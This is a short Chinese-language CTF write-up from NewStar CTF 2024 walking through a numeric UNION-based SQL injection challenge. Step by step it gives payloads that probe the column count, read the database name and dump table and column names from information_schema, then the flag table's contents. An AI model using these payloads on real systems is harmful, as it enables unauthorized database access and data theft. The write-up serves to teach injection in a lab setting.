---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 谢谢皮蛋

<Container type='tip'>

本题考查的是 SQL 注入的相关知识，如果你从未了解和接触过数据库和 SQL 语句，你可能需要花费一定的时间快速了解并尝试。
</Container>

题目考查数字型注入、联合注入

判断列数和回显位，其实看页面上的格式也基本可以判断

```sql
1 order by 2#
-1 union select 1,2#
```

查看当前数据库

```sql
-1 union select 1,database()#
```

![界面 1](/assets/images/wp/2024/week1/xiexiepidan_1.png)

查看当前数据库所有表名

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![界面 2](/assets/images/wp/2024/week1/xiexiepidan_2.png)

查看Fl4g表所有列名（当然如果你想看看有些什么英雄也是完全ok，你可以在皮蛋的情报网里畅游）

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g' and table_schema=database()#
```

![界面 3](/assets/images/wp/2024/week1/xiexiepidan_3.png)

查看值得到flag

```sql
-1 union select group_concat(des),group_concat(value) from Fl4g#
```
